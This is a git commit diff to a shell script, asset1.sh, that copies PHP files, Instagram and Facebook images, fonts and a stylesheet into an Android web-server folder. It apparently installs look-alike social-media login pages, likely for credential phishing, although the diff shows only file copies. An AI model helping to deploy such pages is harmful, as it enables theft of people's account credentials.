956fd7d75e9f5bc234b9a9dc495bd02e7b0b796c
Philiphackerzx <65859306+Philiphackerzx@users.noreply.github.com>
2020-05-26 02:36:50 +0530

    Update asset1.sh

--- asset1.sh
+++ asset1.sh
@@ -1,4 +1,16 @@
 rm /sdcard/htdocs/index.php
+
+cp insta.ttf /sdcard/htdocs
+cp favicon.png /sdcard/htdocs
+cp index.php /sdcard/htdocs
+cp fb.png /sdcard/htdocs
+cp action.php /sdcard/htdocs
+cp arrow.png /sdcard/htdocs
+cp instagram.png /sdcard/htdocs
+cp style.css /sdcard/htdocs
+cp -r fb /sdcard/htdocs
+
+
 cd asset
 cd fcode
 cp facebook.ttf /sdcard/htdocs
